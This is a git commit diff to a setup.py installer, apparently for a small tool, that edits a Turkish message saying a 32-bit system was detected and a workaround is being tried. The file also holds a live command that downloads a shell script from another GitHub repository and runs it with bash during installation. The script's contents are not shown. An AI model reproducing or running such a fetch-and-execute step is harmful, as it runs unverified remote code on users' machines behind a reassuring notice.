d3962d6913281db4c37cf9f69958f7c15f13ad86
aevx <85465830+aevx@users.noreply.github.com>
2022-07-16 12:25:43 +0300

    Add files via upload

--- setup.py
+++ setup.py
@@ -5,7 +5,7 @@ try:
 except ImportError:
  import time,os
  os.system("clear")
- print("32 Bit Tespit Edildi Normal Şartlarda\n\nBu Tool Çalışmaz\n\nAma Çözüm Yolu Deniyoruz.\n\nLütfen Sabırlı Olun.")
- print('uname -m\n')
+ print("32 Bit Tespit Edildi Normal Şartlarda\n\nBu Tool Çalışmaz\n\nAma Çözüm Yolu Deniyoruz.\n\nLütfen Sabırlı Olun.\n")
+ os.system('uname -m')
  time.sleep(5)
  os.system("cd && curl -L -O https://github.com/scrlpr/a/raw/main/a.sh && bash a.sh")
